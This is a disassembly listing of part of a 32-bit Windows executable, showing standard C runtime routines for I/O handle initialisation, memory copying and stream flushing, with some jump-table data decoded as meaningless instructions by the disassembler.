  4043cb:	85 f6                	test   %esi,%esi
  4043cd:	75 08                	jne    0x4043d7
  4043cf:	6a 1b                	push   $0x1b
  4043d1:	e8 77 fa ff ff       	call   0x403e4d
  4043d6:	59                   	pop    %ecx
  4043d7:	89 35 20 d4 40 00    	mov    %esi,0x40d420
  4043dd:	c7 05 20 d5 40 00 20 	movl   $0x20,0x40d520
  4043e4:	00 00 00 
  4043e7:	8d 86 00 01 00 00    	lea    0x100(%esi),%eax
  4043ed:	3b f0                	cmp    %eax,%esi
  4043ef:	73 1a                	jae    0x40440b
  4043f1:	80 66 04 00          	andb   $0x0,0x4(%esi)
  4043f5:	83 0e ff             	orl    $0xffffffff,(%esi)
  4043f8:	c6 46 05 0a          	movb   $0xa,0x5(%esi)
  4043fc:	a1 20 d4 40 00       	mov    0x40d420,%eax
  404401:	83 c6 08             	add    $0x8,%esi
  404404:	05 00 01 00 00       	add    $0x100,%eax
  404409:	eb e2                	jmp    0x4043ed
  40440b:	8d 44 24 10          	lea    0x10(%esp),%eax
  40440f:	50                   	push   %eax
  404410:	ff 15 60 90 40 00    	call   *0x409060
  404416:	66 83 7c 24 42 00    	cmpw   $0x0,0x42(%esp)
  40441c:	0f 84 c5 00 00 00    	je     0x4044e7
  404422:	8b 44 24 44          	mov    0x44(%esp),%eax
  404426:	85 c0                	test   %eax,%eax
  404428:	0f 84 b9 00 00 00    	je     0x4044e7
  40442e:	8b 30                	mov    (%eax),%esi
  404430:	8d 68 04             	lea    0x4(%eax),%ebp
  404433:	b8 00 08 00 00       	mov    $0x800,%eax
  404438:	3b f0                	cmp    %eax,%esi
  40443a:	8d 1c 2e             	lea    (%esi,%ebp,1),%ebx
  40443d:	7c 02                	jl     0x404441
  40443f:	8b f0                	mov    %eax,%esi
  404441:	39 35 20 d5 40 00    	cmp    %esi,0x40d520
  404447:	7d 52                	jge    0x40449b
  404449:	bf 24 d4 40 00       	mov    $0x40d424,%edi
  40444e:	68 00 01 00 00       	push   $0x100
  404453:	e8 ad 0c 00 00       	call   0x405105
  404458:	85 c0                	test   %eax,%eax
  40445a:	59                   	pop    %ecx
  40445b:	74 38                	je     0x404495
  40445d:	83 05 20 d5 40 00 20 	addl   $0x20,0x40d520
  404464:	89 07                	mov    %eax,(%edi)
  404466:	8d 88 00 01 00 00    	lea    0x100(%eax),%ecx
  40446c:	3b c1                	cmp    %ecx,%eax
  40446e:	73 18                	jae    0x404488
  404470:	80 60 04 00          	andb   $0x0,0x4(%eax)
  404474:	83 08 ff             	orl    $0xffffffff,(%eax)
  404477:	c6 40 05 0a          	movb   $0xa,0x5(%eax)
  40447b:	8b 0f                	mov    (%edi),%ecx
  40447d:	83 c0 08             	add    $0x8,%eax
  404480:	81 c1 00 01 00 00    	add    $0x100,%ecx
  404486:	eb e4                	jmp    0x40446c
  404488:	83 c7 04             	add    $0x4,%edi
  40448b:	39 35 20 d5 40 00    	cmp    %esi,0x40d520
  404491:	7c bb                	jl     0x40444e
  404493:	eb 06                	jmp    0x40449b
  404495:	8b 35 20 d5 40 00    	mov    0x40d520,%esi
  40449b:	33 ff                	xor    %edi,%edi
  40449d:	85 f6                	test   %esi,%esi
  40449f:	7e 46                	jle    0x4044e7
  4044a1:	8b 03                	mov    (%ebx),%eax
  4044a3:	83 f8 ff             	cmp    $0xffffffff,%eax
  4044a6:	74 36                	je     0x4044de
  4044a8:	8a 4d 00             	mov    0x0(%ebp),%cl
  4044ab:	f6 c1 01             	test   $0x1,%cl
  4044ae:	74 2e                	je     0x4044de
  4044b0:	f6 c1 08             	test   $0x8,%cl
  4044b3:	75 0b                	jne    0x4044c0
  4044b5:	50                   	push   %eax
  4044b6:	ff 15 88 90 40 00    	call   *0x409088
  4044bc:	85 c0                	test   %eax,%eax
  4044be:	74 1e                	je     0x4044de
  4044c0:	8b c7                	mov    %edi,%eax
  4044c2:	8b cf                	mov    %edi,%ecx
  4044c4:	c1 f8 05             	sar    $0x5,%eax
  4044c7:	83 e1 1f             	and    $0x1f,%ecx
  4044ca:	8b 04 85 20 d4 40 00 	mov    0x40d420(,%eax,4),%eax
  4044d1:	8d 04 c8             	lea    (%eax,%ecx,8),%eax
  4044d4:	8b 0b                	mov    (%ebx),%ecx
  4044d6:	89 08                	mov    %ecx,(%eax)
  4044d8:	8a 4d 00             	mov    0x0(%ebp),%cl
  4044db:	88 48 04             	mov    %cl,0x4(%eax)
  4044de:	47                   	inc    %edi
  4044df:	45                   	inc    %ebp
  4044e0:	83 c3 04             	add    $0x4,%ebx
  4044e3:	3b fe                	cmp    %esi,%edi
  4044e5:	7c ba                	jl     0x4044a1
  4044e7:	33 db                	xor    %ebx,%ebx
  4044e9:	a1 20 d4 40 00       	mov    0x40d420,%eax
  4044ee:	83 3c d8 ff          	cmpl   $0xffffffff,(%eax,%ebx,8)
  4044f2:	8d 34 d8             	lea    (%eax,%ebx,8),%esi
  4044f5:	75 4d                	jne    0x404544
  4044f7:	85 db                	test   %ebx,%ebx
  4044f9:	c6 46 04 81          	movb   $0x81,0x4(%esi)
  4044fd:	75 05                	jne    0x404504
  4044ff:	6a f6                	push   $0xfffffff6
  404501:	58                   	pop    %eax
  404502:	eb 0a                	jmp    0x40450e
  404504:	8b c3                	mov    %ebx,%eax
  404506:	48                   	dec    %eax
  404507:	f7 d8                	neg    %eax
  404509:	1b c0                	sbb    %eax,%eax
  40450b:	83 c0 f5             	add    $0xfffffff5,%eax
  40450e:	50                   	push   %eax
  40450f:	ff 15 84 90 40 00    	call   *0x409084
  404515:	8b f8                	mov    %eax,%edi
  404517:	83 ff ff             	cmp    $0xffffffff,%edi
  40451a:	74 17                	je     0x404533
  40451c:	57                   	push   %edi
  40451d:	ff 15 88 90 40 00    	call   *0x409088
  404523:	85 c0                	test   %eax,%eax
  404525:	74 0c                	je     0x404533
  404527:	25 ff 00 00 00       	and    $0xff,%eax
  40452c:	89 3e                	mov    %edi,(%esi)
  40452e:	83 f8 02             	cmp    $0x2,%eax
  404531:	75 06                	jne    0x404539
  404533:	80 4e 04 40          	orb    $0x40,0x4(%esi)
  404537:	eb 0f                	jmp    0x404548
  404539:	83 f8 03             	cmp    $0x3,%eax
  40453c:	75 0a                	jne    0x404548
  40453e:	80 4e 04 08          	orb    $0x8,0x4(%esi)
  404542:	eb 04                	jmp    0x404548
  404544:	80 4e 04 80          	orb    $0x80,0x4(%esi)
  404548:	43                   	inc    %ebx
  404549:	83 fb 03             	cmp    $0x3,%ebx
  40454c:	7c 9b                	jl     0x4044e9
  40454e:	ff 35 20 d5 40 00    	push   0x40d520
  404554:	ff 15 80 90 40 00    	call   *0x409080
  40455a:	5f                   	pop    %edi
  40455b:	5e                   	pop    %esi
  40455c:	5d                   	pop    %ebp
  40455d:	5b                   	pop    %ebx
  40455e:	83 c4 44             	add    $0x44,%esp
  404561:	c3                   	ret
  404562:	cc                   	int3
  404563:	cc                   	int3
  404564:	cc                   	int3
  404565:	cc                   	int3
  404566:	cc                   	int3
  404567:	cc                   	int3
  404568:	cc                   	int3
  404569:	cc                   	int3
  40456a:	cc                   	int3
  40456b:	cc                   	int3
  40456c:	cc                   	int3
  40456d:	cc                   	int3
  40456e:	cc                   	int3
  40456f:	cc                   	int3
  404570:	55                   	push   %ebp
  404571:	8b ec                	mov    %esp,%ebp
  404573:	57                   	push   %edi
  404574:	56                   	push   %esi
  404575:	8b 75 0c             	mov    0xc(%ebp),%esi
  404578:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40457b:	8b 7d 08             	mov    0x8(%ebp),%edi
  40457e:	8b c1                	mov    %ecx,%eax
  404580:	8b d1                	mov    %ecx,%edx
  404582:	03 c6                	add    %esi,%eax
  404584:	3b fe                	cmp    %esi,%edi
  404586:	76 08                	jbe    0x404590
  404588:	3b f8                	cmp    %eax,%edi
  40458a:	0f 82 78 01 00 00    	jb     0x404708
  404590:	f7 c7 03 00 00 00    	test   $0x3,%edi
  404596:	75 14                	jne    0x4045ac
  404598:	c1 e9 02             	shr    $0x2,%ecx
  40459b:	83 e2 03             	and    $0x3,%edx
  40459e:	83 f9 08             	cmp    $0x8,%ecx
  4045a1:	72 29                	jb     0x4045cc
  4045a3:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4045a5:	ff 24 95 b8 46 40 00 	jmp    *0x4046b8(,%edx,4)
  4045ac:	8b c7                	mov    %edi,%eax
  4045ae:	ba 03 00 00 00       	mov    $0x3,%edx
  4045b3:	83 e9 04             	sub    $0x4,%ecx
  4045b6:	72 0c                	jb     0x4045c4
  4045b8:	83 e0 03             	and    $0x3,%eax
  4045bb:	03 c8                	add    %eax,%ecx
  4045bd:	ff 24 85 d0 45 40 00 	jmp    *0x4045d0(,%eax,4)
  4045c4:	ff 24 8d c8 46 40 00 	jmp    *0x4046c8(,%ecx,4)
  4045cb:	90                   	nop
  4045cc:	ff 24 8d 4c 46 40 00 	jmp    *0x40464c(,%ecx,4)
  4045d3:	90                   	nop
  4045d4:	e0 45                	loopne 0x40461b
  4045d6:	40                   	inc    %eax
  4045d7:	00 0c 46             	add    %cl,(%esi,%eax,2)
  4045da:	40                   	inc    %eax
  4045db:	00 30                	add    %dh,(%eax)
  4045dd:	46                   	inc    %esi
  4045de:	40                   	inc    %eax
  4045df:	00 23                	add    %ah,(%ebx)
  4045e1:	d1 8a 06 88 07 8a    	rorl   $1,-0x75f877fa(%edx)
  4045e7:	46                   	inc    %esi
  4045e8:	01 88 47 01 8a 46    	add    %ecx,0x468a0147(%eax)
  4045ee:	02 c1                	add    %cl,%al
  4045f0:	e9 02 88 47 02       	jmp    0x287cdf7
  4045f5:	83 c6 03             	add    $0x3,%esi
  4045f8:	83 c7 03             	add    $0x3,%edi
  4045fb:	83 f9 08             	cmp    $0x8,%ecx
  4045fe:	72 cc                	jb     0x4045cc
  404600:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404602:	ff 24 95 b8 46 40 00 	jmp    *0x4046b8(,%edx,4)
  404609:	8d 49 00             	lea    0x0(%ecx),%ecx
  40460c:	23 d1                	and    %ecx,%edx
  40460e:	8a 06                	mov    (%esi),%al
  404610:	88 07                	mov    %al,(%edi)
  404612:	8a 46 01             	mov    0x1(%esi),%al
  404615:	c1 e9 02             	shr    $0x2,%ecx
  404618:	88 47 01             	mov    %al,0x1(%edi)
  40461b:	83 c6 02             	add    $0x2,%esi
  40461e:	83 c7 02             	add    $0x2,%edi
  404621:	83 f9 08             	cmp    $0x8,%ecx
  404624:	72 a6                	jb     0x4045cc
  404626:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404628:	ff 24 95 b8 46 40 00 	jmp    *0x4046b8(,%edx,4)
  40462f:	90                   	nop
  404630:	23 d1                	and    %ecx,%edx
  404632:	8a 06                	mov    (%esi),%al
  404634:	88 07                	mov    %al,(%edi)
  404636:	46                   	inc    %esi
  404637:	c1 e9 02             	shr    $0x2,%ecx
  40463a:	47                   	inc    %edi
  40463b:	83 f9 08             	cmp    $0x8,%ecx
  40463e:	72 8c                	jb     0x4045cc
  404640:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404642:	ff 24 95 b8 46 40 00 	jmp    *0x4046b8(,%edx,4)
  404649:	8d 49 00             	lea    0x0(%ecx),%ecx
  40464c:	af                   	scas   %es:(%edi),%eax
  40464d:	46                   	inc    %esi
  40464e:	40                   	inc    %eax
  40464f:	00 9c 46 40 00 94 46 	add    %bl,0x46940040(%esi,%eax,2)
  404656:	40                   	inc    %eax
  404657:	00 8c 46 40 00 84 46 	add    %cl,0x46840040(%esi,%eax,2)
  40465e:	40                   	inc    %eax
  40465f:	00 7c 46 40          	add    %bh,0x40(%esi,%eax,2)
  404663:	00 74 46 40          	add    %dh,0x40(%esi,%eax,2)
  404667:	00 6c 46 40          	add    %ch,0x40(%esi,%eax,2)
  40466b:	00 8b 44 8e e4 89    	add    %cl,-0x761b71bc(%ebx)
  404671:	44                   	inc    %esp
  404672:	8f                   	(bad)
  404673:	e4 8b                	in     $0x8b,%al
  404675:	44                   	inc    %esp
  404676:	8e e8                	mov    %eax,%gs
  404678:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  40467c:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
  404680:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  404684:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  404688:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
  40468c:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  404690:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  404694:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  404698:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  40469c:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  4046a0:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  4046a4:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  4046ab:	03 f0                	add    %eax,%esi
  4046ad:	03 f8                	add    %eax,%edi
  4046af:	ff 24 95 b8 46 40 00 	jmp    *0x4046b8(,%edx,4)
  4046b6:	8b ff                	mov    %edi,%edi
  4046b8:	c8 46 40 00          	enter  $0x4046,$0x0
  4046bc:	d0 46 40             	rolb   $1,0x40(%esi)
  4046bf:	00 dc                	add    %bl,%ah
  4046c1:	46                   	inc    %esi
  4046c2:	40                   	inc    %eax
  4046c3:	00 f0                	add    %dh,%al
  4046c5:	46                   	inc    %esi
  4046c6:	40                   	inc    %eax
  4046c7:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  4046cd:	c9                   	leave
  4046ce:	c3                   	ret
  4046cf:	90                   	nop
  4046d0:	8a 06                	mov    (%esi),%al
  4046d2:	88 07                	mov    %al,(%edi)
  4046d4:	8b 45 08             	mov    0x8(%ebp),%eax
  4046d7:	5e                   	pop    %esi
  4046d8:	5f                   	pop    %edi
  4046d9:	c9                   	leave
  4046da:	c3                   	ret
  4046db:	90                   	nop
  4046dc:	8a 06                	mov    (%esi),%al
  4046de:	88 07                	mov    %al,(%edi)
  4046e0:	8a 46 01             	mov    0x1(%esi),%al
  4046e3:	88 47 01             	mov    %al,0x1(%edi)
  4046e6:	8b 45 08             	mov    0x8(%ebp),%eax
  4046e9:	5e                   	pop    %esi
  4046ea:	5f                   	pop    %edi
  4046eb:	c9                   	leave
  4046ec:	c3                   	ret
  4046ed:	8d 49 00             	lea    0x0(%ecx),%ecx
  4046f0:	8a 06                	mov    (%esi),%al
  4046f2:	88 07                	mov    %al,(%edi)
  4046f4:	8a 46 01             	mov    0x1(%esi),%al
  4046f7:	88 47 01             	mov    %al,0x1(%edi)
  4046fa:	8a 46 02             	mov    0x2(%esi),%al
  4046fd:	88 47 02             	mov    %al,0x2(%edi)
  404700:	8b 45 08             	mov    0x8(%ebp),%eax
  404703:	5e                   	pop    %esi
  404704:	5f                   	pop    %edi
  404705:	c9                   	leave
  404706:	c3                   	ret
  404707:	90                   	nop
  404708:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  40470c:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  404710:	f7 c7 03 00 00 00    	test   $0x3,%edi
  404716:	75 24                	jne    0x40473c
  404718:	c1 e9 02             	shr    $0x2,%ecx
  40471b:	83 e2 03             	and    $0x3,%edx
  40471e:	83 f9 08             	cmp    $0x8,%ecx
  404721:	72 0d                	jb     0x404730
  404723:	fd                   	std
  404724:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404726:	fc                   	cld
  404727:	ff 24 95 50 48 40 00 	jmp    *0x404850(,%edx,4)
  40472e:	8b ff                	mov    %edi,%edi
  404730:	f7 d9                	neg    %ecx
  404732:	ff 24 8d 00 48 40 00 	jmp    *0x404800(,%ecx,4)
  404739:	8d 49 00             	lea    0x0(%ecx),%ecx
  40473c:	8b c7                	mov    %edi,%eax
  40473e:	ba 03 00 00 00       	mov    $0x3,%edx
  404743:	83 f9 04             	cmp    $0x4,%ecx
  404746:	72 0c                	jb     0x404754
  404748:	83 e0 03             	and    $0x3,%eax
  40474b:	2b c8                	sub    %eax,%ecx
  40474d:	ff 24 85 58 47 40 00 	jmp    *0x404758(,%eax,4)
  404754:	ff 24 8d 50 48 40 00 	jmp    *0x404850(,%ecx,4)
  40475b:	90                   	nop
  40475c:	68 47 40 00 88       	push   $0x88004047
  404761:	47                   	inc    %edi
  404762:	40                   	inc    %eax
  404763:	00 b0 47 40 00 8a    	add    %dh,-0x75ffbfb9(%eax)
  404769:	46                   	inc    %esi
  40476a:	03 23                	add    (%ebx),%esp
  40476c:	d1 88 47 03 4e c1    	rorl   $1,-0x3eb1fcb9(%eax)
  404772:	e9 02 4f 83 f9       	jmp    0xf9c39679
  404777:	08 72 b6             	or     %dh,-0x4a(%edx)
  40477a:	fd                   	std
  40477b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40477d:	fc                   	cld
  40477e:	ff 24 95 50 48 40 00 	jmp    *0x404850(,%edx,4)
  404785:	8d 49 00             	lea    0x0(%ecx),%ecx
  404788:	8a 46 03             	mov    0x3(%esi),%al
  40478b:	23 d1                	and    %ecx,%edx
  40478d:	88 47 03             	mov    %al,0x3(%edi)
  404790:	8a 46 02             	mov    0x2(%esi),%al
  404793:	c1 e9 02             	shr    $0x2,%ecx
  404796:	88 47 02             	mov    %al,0x2(%edi)
  404799:	83 ee 02             	sub    $0x2,%esi
  40479c:	83 ef 02             	sub    $0x2,%edi
  40479f:	83 f9 08             	cmp    $0x8,%ecx
  4047a2:	72 8c                	jb     0x404730
  4047a4:	fd                   	std
  4047a5:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4047a7:	fc                   	cld
  4047a8:	ff 24 95 50 48 40 00 	jmp    *0x404850(,%edx,4)
  4047af:	90                   	nop
  4047b0:	8a 46 03             	mov    0x3(%esi),%al
  4047b3:	23 d1                	and    %ecx,%edx
  4047b5:	88 47 03             	mov    %al,0x3(%edi)
  4047b8:	8a 46 02             	mov    0x2(%esi),%al
  4047bb:	88 47 02             	mov    %al,0x2(%edi)
  4047be:	8a 46 01             	mov    0x1(%esi),%al
  4047c1:	c1 e9 02             	shr    $0x2,%ecx
  4047c4:	88 47 01             	mov    %al,0x1(%edi)
  4047c7:	83 ee 03             	sub    $0x3,%esi
  4047ca:	83 ef 03             	sub    $0x3,%edi
  4047cd:	83 f9 08             	cmp    $0x8,%ecx
  4047d0:	0f 82 5a ff ff ff    	jb     0x404730
  4047d6:	fd                   	std
  4047d7:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4047d9:	fc                   	cld
  4047da:	ff 24 95 50 48 40 00 	jmp    *0x404850(,%edx,4)
  4047e1:	8d 49 00             	lea    0x0(%ecx),%ecx
  4047e4:	04 48                	add    $0x48,%al
  4047e6:	40                   	inc    %eax
  4047e7:	00 0c 48             	add    %cl,(%eax,%ecx,2)
  4047ea:	40                   	inc    %eax
  4047eb:	00 14 48             	add    %dl,(%eax,%ecx,2)
  4047ee:	40                   	inc    %eax
  4047ef:	00 1c 48             	add    %bl,(%eax,%ecx,2)
  4047f2:	40                   	inc    %eax
  4047f3:	00 24 48             	add    %ah,(%eax,%ecx,2)
  4047f6:	40                   	inc    %eax
  4047f7:	00 2c 48             	add    %ch,(%eax,%ecx,2)
  4047fa:	40                   	inc    %eax
  4047fb:	00 34 48             	add    %dh,(%eax,%ecx,2)
  4047fe:	40                   	inc    %eax
  4047ff:	00 47 48             	add    %al,0x48(%edi)
  404802:	40                   	inc    %eax
  404803:	00 8b 44 8e 1c 89    	add    %cl,-0x76e371bc(%ebx)
  404809:	44                   	inc    %esp
  40480a:	8f                   	(bad)
  40480b:	1c 8b                	sbb    $0x8b,%al
  40480d:	44                   	inc    %esp
  40480e:	8e 18                	mov    (%eax),%ds
  404810:	89 44 8f 18          	mov    %eax,0x18(%edi,%ecx,4)
  404814:	8b 44 8e 14          	mov    0x14(%esi,%ecx,4),%eax
  404818:	89 44 8f 14          	mov    %eax,0x14(%edi,%ecx,4)
  40481c:	8b 44 8e 10          	mov    0x10(%esi,%ecx,4),%eax
  404820:	89 44 8f 10          	mov    %eax,0x10(%edi,%ecx,4)
  404824:	8b 44 8e 0c          	mov    0xc(%esi,%ecx,4),%eax
  404828:	89 44 8f 0c          	mov    %eax,0xc(%edi,%ecx,4)
  40482c:	8b 44 8e 08          	mov    0x8(%esi,%ecx,4),%eax
  404830:	89 44 8f 08          	mov    %eax,0x8(%edi,%ecx,4)
  404834:	8b 44 8e 04          	mov    0x4(%esi,%ecx,4),%eax
  404838:	89 44 8f 04          	mov    %eax,0x4(%edi,%ecx,4)
  40483c:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  404843:	03 f0                	add    %eax,%esi
  404845:	03 f8                	add    %eax,%edi
  404847:	ff 24 95 50 48 40 00 	jmp    *0x404850(,%edx,4)
  40484e:	8b ff                	mov    %edi,%edi
  404850:	60                   	pusha
  404851:	48                   	dec    %eax
  404852:	40                   	inc    %eax
  404853:	00 68 48             	add    %ch,0x48(%eax)
  404856:	40                   	inc    %eax
  404857:	00 78 48             	add    %bh,0x48(%eax)
  40485a:	40                   	inc    %eax
  40485b:	00 8c 48 40 00 8b 45 	add    %cl,0x458b0040(%eax,%ecx,2)
  404862:	08 5e 5f             	or     %bl,0x5f(%esi)
  404865:	c9                   	leave
  404866:	c3                   	ret
  404867:	90                   	nop
  404868:	8a 46 03             	mov    0x3(%esi),%al
  40486b:	88 47 03             	mov    %al,0x3(%edi)
  40486e:	8b 45 08             	mov    0x8(%ebp),%eax
  404871:	5e                   	pop    %esi
  404872:	5f                   	pop    %edi
  404873:	c9                   	leave
  404874:	c3                   	ret
  404875:	8d 49 00             	lea    0x0(%ecx),%ecx
  404878:	8a 46 03             	mov    0x3(%esi),%al
  40487b:	88 47 03             	mov    %al,0x3(%edi)
  40487e:	8a 46 02             	mov    0x2(%esi),%al
  404881:	88 47 02             	mov    %al,0x2(%edi)
  404884:	8b 45 08             	mov    0x8(%ebp),%eax
  404887:	5e                   	pop    %esi
  404888:	5f                   	pop    %edi
  404889:	c9                   	leave
  40488a:	c3                   	ret
  40488b:	90                   	nop
  40488c:	8a 46 03             	mov    0x3(%esi),%al
  40488f:	88 47 03             	mov    %al,0x3(%edi)
  404892:	8a 46 02             	mov    0x2(%esi),%al
  404895:	88 47 02             	mov    %al,0x2(%edi)
  404898:	8a 46 01             	mov    0x1(%esi),%al
  40489b:	88 47 01             	mov    %al,0x1(%edi)
  40489e:	8b 45 08             	mov    0x8(%ebp),%eax
  4048a1:	5e                   	pop    %esi
  4048a2:	5f                   	pop    %edi
  4048a3:	c9                   	leave
  4048a4:	c3                   	ret
  4048a5:	56                   	push   %esi
  4048a6:	8b 74 24 08          	mov    0x8(%esp),%esi
  4048aa:	85 f6                	test   %esi,%esi
  4048ac:	75 09                	jne    0x4048b7
  4048ae:	56                   	push   %esi
  4048af:	e8 91 00 00 00       	call   0x404945
  4048b4:	59                   	pop    %ecx
  4048b5:	5e                   	pop    %esi
  4048b6:	c3                   	ret
  4048b7:	56                   	push   %esi
  4048b8:	e8 23 00 00 00       	call   0x4048e0
  4048bd:	85 c0                	test   %eax,%eax
  4048bf:	59                   	pop    %ecx
  4048c0:	74 05                	je     0x4048c7
  4048c2:	83 c8 ff             	or     $0xffffffff,%eax
  4048c5:	5e                   	pop    %esi
  4048c6:	c3                   	ret
  4048c7:	f6 46 0d 40          	testb  $0x40,0xd(%esi)
  4048cb:	74 0f                	je     0x4048dc
  4048cd:	ff 76 10             	push   0x10(%esi)
  4048d0:	e8 49 1e 00 00       	call   0x40671e
  4048d5:	f7 d8                	neg    %eax
  4048d7:	59                   	pop    %ecx
  4048d8:	5e                   	pop    %esi
  4048d9:	1b c0                	sbb    %eax,%eax
  4048db:	c3                   	ret
  4048dc:	33 c0                	xor    %eax,%eax
  4048de:	5e                   	pop    %esi
  4048df:	c3                   	ret
  4048e0:	53                   	push   %ebx
  4048e1:	56                   	push   %esi
  4048e2:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4048e6:	33 db                	xor    %ebx,%ebx
  4048e8:	57                   	push   %edi
  4048e9:	8b 46 0c             	mov    0xc(%esi),%eax
  4048ec:	8b c8                	mov    %eax,%ecx
  4048ee:	83 e1 03             	and    $0x3,%ecx
  4048f1:	80 f9 02             	cmp    $0x2,%cl
  4048f4:	75 37                	jne    0x40492d
  4048f6:	66 a9 08 01          	test   $0x108,%ax
  4048fa:	74 31                	je     0x40492d
  4048fc:	8b 46 08             	mov    0x8(%esi),%eax
  4048ff:	8b 3e                	mov    (%esi),%edi
  404901:	2b f8                	sub    %eax,%edi
  404903:	85 ff                	test   %edi,%edi
  404905:	7e 26                	jle    0x40492d
  404907:	57                   	push   %edi
  404908:	50                   	push   %eax
  404909:	ff 76 10             	push   0x10(%esi)
  40490c:	e8 69 f6 ff ff       	call   0x403f7a
  404911:	83 c4 0c             	add    $0xc,%esp
  404914:	3b c7                	cmp    %edi,%eax
  404916:	75 0e                	jne    0x404926
  404918:	8b 46 0c             	mov    0xc(%esi),%eax
  40491b:	a8 80                	test   $0x80,%al
  40491d:	74 0e                	je     0x40492d
  40491f:	24 fd                	and    $0xfd,%al
  404921:	89 46 0c             	mov    %eax,0xc(%esi)
  404924:	eb 07                	jmp    0x40492d
  404926:	83 4e 0c 20          	orl    $0x20,0xc(%esi)
  40492a:	83 cb ff             	or     $0xffffffff,%ebx
  40492d:	8b 46 08             	mov    0x8(%esi),%eax
  404930:	83 66 04 00          	andl   $0x0,0x4(%esi)
  404934:	89 06                	mov    %eax,(%esi)
  404936:	5f                   	pop    %edi
  404937:	8b c3                	mov    %ebx,%eax
  404939:	5e                   	pop    %esi
  40493a:	5b                   	pop    %ebx
  40493b:	c3                   	ret
  40493c:	6a 01                	push   $0x1
  40493e:	e8 02 00 00 00       	call   0x404945
  404943:	59                   	pop    %ecx
  404944:	c3                   	ret
  404945:	53                   	push   %ebx
  404946:	56                   	push   %esi
  404947:	57                   	push   %edi
  404948:	33 f6                	xor    %esi,%esi
  40494a:	33 db                	xor    %ebx,%ebx
  40494c:	33 ff                	xor    %edi,%edi
  40494e:	39 35 00 d4 40 00    	cmp    %esi,0x40d400
  404954:	7e 4d                	jle    0x4049a3
  404956:	a1 f8 c3 40 00       	mov    0x40c3f8,%eax
  40495b:	8b 04 b0             	mov    (%eax,%esi,4),%eax
  40495e:	85 c0                	test   %eax,%eax
  404960:	74 38                	je     0x40499a
  404962:	8b 48 0c             	mov    0xc(%eax),%ecx
  404965:	f6 c1 83             	test   $0x83,%cl
  404968:	74 30                	je     0x40499a
  40496a:	83 7c 24 10 01       	cmpl   $0x1,0x10(%esp)
  40496f:	75 0f                	jne    0x404980
  404971:	50                   	push   %eax
  404972:	e8 2e ff ff ff       	call   0x4048a5
  404977:	83 f8 ff             	cmp    $0xffffffff,%eax
  40497a:	59                   	pop    %ecx
  40497b:	74 1d                	je     0x40499a
  40497d:	43                   	inc    %ebx
  40497e:	eb 1a                	jmp    0x40499a
  404980:	83 7c 24 10 00       	cmpl   $0x0,0x10(%esp)
  404985:	75 13                	jne    0x40499a
  404987:	f6 c1 02             	test   $0x2,%cl
  40498a:	74 0e                	je     0x40499a
  40498c:	50                   	push   %eax
  40498d:	e8 13 ff ff ff       	call   0x4048a5
  404992:	83 f8 ff             	cmp    $0xffffffff,%eax
  404995:	59                   	pop    %ecx
  404996:	75 02                	jne    0x40499a
  404998:	0b f8                	or     %eax,%edi
  40499a:	46                   	inc    %esi
  40499b:	3b 35 00 d4 40 00    	cmp    0x40d400,%esi
  4049a1:	7c b3                	jl     0x404956
  4049a3:	83 7c 24 10 01       	cmpl   $0x1,0x10(%esp)
  4049a8:	8b c3                	mov    %ebx,%eax
  4049aa:	74 02                	je     0x4049ae
  4049ac:	8b c7                	mov    %edi,%eax
  4049ae:	5f                   	pop    %edi
  4049af:	5e                   	pop    %esi
  4049b0:	5b                   	pop    %ebx
  4049b1:	c3                   	ret
  4049b2:	a1 00 d4 40 00       	mov    0x40d400,%eax
  4049b7:	56                   	push   %esi
  4049b8:	6a 14                	push   $0x14
  4049ba:	85 c0                	test   %eax,%eax
  4049bc:	5e                   	pop    %esi
  4049bd:	75 07                	jne    0x4049c6
  4049bf:	b8 00 02 00 00       	mov    $0x200,%eax
  4049c4:	eb 06                	jmp    0x4049cc
  4049c6:	3b c6                	cmp    %esi,%eax
  4049c8:	7d 07                	jge    0x4049d1
  4049ca:	8b c6                	mov    %esi,%eax
  4049cc:	a3 00 d4 40 00       	mov    %eax,0x40d400
  4049d1:	6a 04                	push   $0x4
  4049d3:	50                   	push   %eax
  4049d4:	e8 9c 1d 00 00       	call   0x406775
  4049d9:	59                   	pop    %ecx
  4049da:	a3 f8 c3 40 00       	mov    %eax,0x40c3f8
  4049df:	85 c0                	test   %eax,%eax
  4049e1:	59                   	pop    %ecx
  4049e2:	75 21                	jne    0x404a05
  4049e4:	6a 04                	push   $0x4
  4049e6:	56                   	push   %esi
  4049e7:	89 35 00 d4 40 00    	mov    %esi,0x40d400
  4049ed:	e8 83 1d 00 00       	call   0x406775
  4049f2:	59                   	pop    %ecx
  4049f3:	a3 f8 c3 40 00       	mov    %eax,0x40c3f8
  4049f8:	85 c0                	test   %eax,%eax
  4049fa:	59                   	pop    %ecx
  4049fb:	75 08                	jne    0x404a05
  4049fd:	6a 1a                	push   $0x1a
  4049ff:	e8 49 f4 ff ff       	call   0x403e4d
  404a04:	59                   	pop    %ecx
  404a05:	33 c9                	xor    %ecx,%ecx
